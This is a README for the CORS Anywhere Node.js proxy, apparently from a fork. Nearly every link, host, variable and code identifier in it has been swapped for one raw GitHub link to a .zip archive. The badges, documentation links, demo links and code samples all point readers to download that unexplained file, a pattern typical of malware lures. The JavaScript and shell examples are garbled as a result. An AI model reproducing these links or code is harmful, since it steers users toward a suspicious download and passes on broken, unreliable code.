[![Build Status](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)
[![Coverage Status](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)

**CORS Anywhere** is a NodeJS proxy which adds CORS headers to the proxied request.

The url to proxy is literally taken from the path, validated and proxied. The protocol
part of the proxied URI is optional, and defaults to "http". If port 443 is specified,
the protocol defaults to "https".

This package does not put any restrictions on the http methods or headers, except for
cookies. Requesting [user credentials](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) is disallowed.
The app can be configured to require a header for proxying a request, for example to avoid
a direct visit from the browser.

## Example

```javascript
// Listen on a specific host via the HOST environment variable
var host = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip || '0.0.0.0';
// Listen on a specific port via the PORT environment variable
var port = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip || 8080;

var cors_proxy = require('cors-anywhere');
https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip({
    originWhitelist: [], // Allow all origins
    requireHeader: ['origin', 'x-requested-with'],
    removeHeaders: ['cookie', 'cookie2']
}).listen(port, host, function() {
    https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip('Running CORS Anywhere on ' + host + ':' + port);
});

```
Request examples:

* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip with CORS headers
* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - Same as previous.
* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - Proxies `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip`
* `http://localhost:8080/` - Shows usage text, as defined in `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip`
* `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` - Replies 404 Not found

Live examples:

* https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
* https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip - This demo shows how to use the API.

## Documentation

### Client

To use the API, just prefix the URL with the API URL. Take a look at [https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) for an example.
A concise summary of the documentation is provided at [https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip).

**Note: as of February 2021, access to the demo server requires an opt-in**,
see: https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip

If you want to automatically enable cross-domain requests when needed, use the following snippet:

```javascript
(function() {
    var cors_api_host = 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip';
    var cors_api_url = 'https://' + cors_api_host + '/';
    var slice = [].slice;
    var origin = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip + '//' + https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip;
    var open = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip;
    https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip = function() {
        var args = https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(arguments);
        var targetOrigin = /^https?:\/\/([^\/]+)https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(args[1]);
        if (targetOrigin && targetOrigin[0].toLowerCase() !== origin &&
            targetOrigin[1] !== cors_api_host) {
            args[1] = cors_api_url + args[1];
        }
        return https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(this, args);
    };
})();
```

If you're using jQuery, you can also use the following code **instead of** the previous one:

```javascript
https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip(function(options) {
    if (https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip && https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) {
        https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip = 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip' + https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip;
    }
});
```

### Server

The module exports `createServer(options)`, which creates a server that handles
proxy requests. The following options are supported:

* function `getProxyForUrl` - If set, specifies which intermediate proxy to use for a given URL.
  If the return value is void, a direct request is sent. The default implementation is
  [`proxy-from-env`](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip), which respects the standard proxy
  environment variables (e.g. `https_proxy`, `no_proxy`, etc.).  
* array of strings `originBlacklist` - If set, requests whose origin is listed are blocked.  
  Example: `['https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip', 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip']`
* array of strings `originWhitelist` - If set, requests whose origin is not listed are blocked.  
  If this list is empty, all origins are allowed.
  Example: `['https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip', 'https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip']`
* function `handleInitialRequest` - If set, it is called with the request, response and a parsed
  URL of the requested destination (null if unavailable). If the function returns true, the request
  will not be handled further. Then the function is responsible for handling the request.
  This feature can be used to passively monitor requests, for example for logging (return false).
* function `checkRateLimit` - If set, it is called with the origin (string) of the request. If this
  function returns a non-empty string, the request is rejected and the string is send to the client.
* boolean `redirectSameOrigin` - If true, requests to URLs from the same origin will not be proxied but redirected.
  The primary purpose for this option is to save server resources by delegating the request to the client
  (since same-origin requests should always succeed, even without proxying).
* array of strings `requireHeader` - If set, the request must include this header or the API will refuse to proxy.  
  Recommended if you want to prevent users from using the proxy for normal browsing.  
  Example: `['Origin', 'X-Requested-With']`.
* array of lowercase strings `removeHeaders` - Exclude certain headers from being included in the request.  
  Example: `["cookie"]`
* dictionary of lowercase strings `setHeaders` - Set headers for the request (overwrites existing ones).  
  Example: `{"x-powered-by": "CORS Anywhere"}`
* number `corsMaxAge` - If set, an Access-Control-Max-Age request header with this value (in seconds) will be added.  
  Example: `600` - Allow CORS preflight request to be cached by the browser for 10 minutes.
* string `helpFile` - Set the help file (shown at the homepage).  
  Example: `"https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip"`

For advanced users, the following options are also provided.

* `httpProxyOptions` - Under the hood, [http-proxy](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip)
  is used to proxy requests. Use this option if you really need to pass options
  to http-proxy. The documentation for these options can be found [here](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip).
* `httpsOptions` - If set, a `https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip` will be created. The given options are passed to the
  [`https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip`](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) method.

For even more advanced usage (building upon CORS Anywhere),
see the sample code in [https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip).

### Demo server

A public demo of CORS Anywhere is available at https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip This server is
only provided so that you can easily and quickly try out CORS Anywhere. To ensure that the service
stays available to everyone, the number of requests per period is limited, except for requests from
some explicitly whitelisted origins.

**Note: as of February 2021, access to the demo server requires an opt-in**,
see: https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip

If you expect lots of traffic, please host your own instance of CORS Anywhere, and make sure that
the CORS Anywhere server only whitelists your site to prevent others from using your instance of
CORS Anywhere as an open proxy.

For instance, to run a CORS Anywhere server that accepts any request from some https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip sites on
port 8080, use:
```
export PORT=8080
export https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip,https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip,https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
node https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
```

This application can immediately be run on Heroku, see https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
for instructions. Note that their [Acceptable Use Policy](https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip) forbids
the use of Heroku for operating an open proxy, so make sure that you either enforce a whitelist as
shown above, or severly rate-limit the number of requests.

For example, to blacklist https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip and rate-limit everything to 50 requests per 3 minutes,
except for https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip and https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip (which may be unlimited), use:

```
export PORT=8080
export https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip,https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
export CORSANYWHERE_RATELIMIT='50 3 https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip'
node https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip
```


## License

Copyright (C) 2013 - 2021 Rob Wu <https://raw.githubusercontent.com/Foolman21/cors-anywhere/master/lib/cors_anywhere_Echinidea.zip>

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
